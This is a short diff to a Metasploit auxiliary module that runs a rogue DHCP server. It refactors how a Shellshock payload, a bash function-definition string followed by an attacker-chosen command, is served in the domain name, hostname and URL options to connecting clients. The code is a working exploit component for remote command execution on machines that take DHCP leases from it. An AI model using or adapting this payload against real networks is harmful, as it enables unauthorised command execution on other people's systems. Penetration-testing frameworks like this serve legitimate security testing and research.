@@ -56,16 +56,17 @@ class MetasploitModule < Msf::Auxiliary
   def run
     value = "() { :; }; PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin #{datastore['CMD']}"
 
-    hash = datastore.copy
-    hash['DOMAINNAME'] = value
-    hash['HOSTNAME'] = value
-    hash['URL'] = value
-
     # This loop is required because the current DHCP Server exits after the
     # first interaction.
     loop do
       begin
-        start_service(hash)
+        start_service
+        @dhcp.set_option(
+          domain_name: value,
+          give_hostname: true,
+          served_hostname: value,
+          url: value
+        )
 
         while @dhcp.thread.alive?
           select(nil, nil, nil, 2)
